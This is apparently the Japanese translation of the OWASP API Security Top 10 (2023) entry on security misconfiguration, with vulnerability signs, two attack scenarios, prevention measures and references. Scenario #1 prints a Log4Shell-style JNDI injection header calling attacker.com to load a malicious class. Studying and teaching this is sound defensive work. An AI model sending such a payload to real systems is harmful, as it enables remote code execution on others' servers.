# API8:2023 セキュリティの設定ミス (Security Misconfiguration)

| 脅威エージェント/攻撃手法 | セキュリティ上の弱点 | 影響 |
| - | - | - |
| API 依存 : 悪用難易度 **容易** | 普及度 **広範** : 検出難易度 **容易** | 技術的影響 **重度** : ビジネス依存 |
| 多くの場合、攻撃者はパッチを適用していない欠陥、共通のエンドポイント、安全でないデフォルト設定で実行しているサービス、保護されていないファイルやディレクトリを見つけて、不認可のアクセスやシステムの知識を得ようとします。このほとんどは公知であり、エクスプロイトが利用できることもあります。 | セキュリティの設定ミスはネットワークレベルからアプリケーションレベルまで API スタックのどのレベルでも起こりえます。不要なサービスやレガシーオプションなどの設定ミスを検出して悪用する自動ツールを利用できます。 | セキュリティの設定ミスは機密性の高いユーザーデータだけではなく、サーバー全体の侵害につながるシステムの詳細も流出する可能性があります。 |

## その API は脆弱か？

API は以下のような場合に脆弱となる可能性があります。

* API スタックのいずれかの部分で適切なセキュリティ堅牢化が行われていない場合や、クラウドサービスで不適切に設定された権限がある場合

* 最新のセキュリティパッチが適用されていない場合や、システムが古い場合
* 不要な機能が有効である場合 (HTTP verb、ログ機能など)
* HTTP サーバーチェーン内のサーバーが受信したリクエストを処理する方法に齟齬がある場合

* Transport Layer Security (TLS) がない場合
* セキュリティディレクティブやキャッシュコントロールディレクティブがクライアントに送信されない場合
* Cross-Origin Resource Sharing (CORS) ポリシーがない場合や適切に設定されていない場合
* エラーメッセージにスタックトレースが含まれている場合や、他の機密情報を公開している場合

## 攻撃シナリオの例

### シナリオ #1

ある API バックエンドサーバーは一般的なサードパーティのオープンソースログ記録ユーティリティによって書き込まれたアクセスログを維持します。これはプレースフォルダ拡張と JNDI (Java Naming and Directory Interface) ルックアップをサポートしており、デフォルトで有効になっています。
各リクエストに対して、新しいエントリが次のパターン `<method> <api_version>/<path> - <status_code>` でログファイルに書き込まれます。




悪意のあるアクターが以下の API リクエストを発行し、それがアクセスログファイルに書き込まれます。


```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

ログ記録ユーティリティの安全でないデフォルト設定と寛容なネットワークアウトバウンドポリシーにより、アクセスログに当該エントリを書き込むために、`X-Api-Version` リクエストヘッダの値を展開して、このログ記録ユーティリティは攻撃者のリモートコントロールサーバーから `Malicious.class` を取得して実行するでしょう。





### シナリオ #2

あるソーシャルネットワークウェブサイトではユーザーがプライベートな会話を続けることができる「ダイレクトメッセージ」機能を提供しています。
特定の会話の新しいメッセージを取得するために、ウェブサイトは以下の API リクエストを発行します (ユーザーによる操作は必要ありません) 。



```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

この API レスポンスには `Cache-Control` HTTP レスポンスヘッダが含まれていないため、プライベートな会話は最終的にウェブブラウザにキャッシュされ、悪意のあるアクターはファイルシステム内のブラウザキャッシュファイルからその会話を取得できます。




## 防止方法

API ライフサイクルには以下を含めます。

* 適切にロックダウンした環境を迅速かつ容易なデプロイメントにつながる反復可能な堅牢化プロセス

* API スタック全体の設定をレビューして更新するタスク。レビューにはオーケストレーションファイル、API コンポーネント、クラウドサービス (S3 バケットのパーミッションなど) を含めます。


* すべての環境における構成と設定の有効性を継続的に評価する自動化されたプロセス


さらに

* クライアントから API サーバーおよびあらゆるダウンストリームコンポーネントおよびアップストリームコンポーネントへのすべての API 通信は、内部 API であるか外部公開 API であるかに関わらず、暗号化された通信チャネル (TLS) で行うようにします。


* 各 API にアクセスできる HTTP verb を特定します。それ以外の HTTP verb (HEAD など) はすべて無効にします。

* ブラウザベースのクライアント (ウェブアプリのフロントエンドなど) からアクセスされることが予想される API は少なくとも以下のことを行う必要があります。

  * 適切な Cross-Origin Resource Sharing (CORS) ポリシーを実装します
  * 適用可能なセキュリティヘッダを含めます
* 受信するコンテンツタイプやデータフォーマットをビジネス要件や機能要件を満たすものに制限します。

* HTTP サーバーチェーンのすべてのサーバー (ロードバランサ、リバースプロキシ、フォワードプロキシ、バックエンドサーバなど) が受信リクエストを均一な方法で処理して、非同期問題を回避するようにします。


* 適用可能であれば、エラーレスポンスを含むすべての API レスポンスペイロードスキーマを定義して適用し、例外トレースやその他の価値ある情報が攻撃者に送り返されることを防ぎます。



## 参考資料

### OWASP

* [OWASP Secure Headers Project][1]
* [Configuration and Deployment Management Testing - Web Security Testing
  Guide][2]
* [Testing for Error Handling - Web Security Testing Guide][3]
* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]

### その他

* [CWE-2: Environmental Security Flaws][5]
* [CWE-16: Configuration][6]
* [CWE-209: Generation of Error Message Containing Sensitive Information][7]
* [CWE-319: Cleartext Transmission of Sensitive Information][8]
* [CWE-388: Error Handling][9]
* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')][10]

* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]
* [Guide to General Server Security][12], NIST
* [Let's Encrypt: a free, automated, and open Certificate Authority][13]

[1]: https://owasp.org/www-project-secure-headers/
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
[5]: https://cwe.mitre.org/data/definitions/2.html
[6]: https://cwe.mitre.org/data/definitions/16.html
[7]: https://cwe.mitre.org/data/definitions/209.html
[8]: https://cwe.mitre.org/data/definitions/319.html
[9]: https://cwe.mitre.org/data/definitions/388.html
[10]: https://cwe.mitre.org/data/definitions/444.html
[11]: https://cwe.mitre.org/data/definitions/942.html
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
[13]: https://letsencrypt.org/
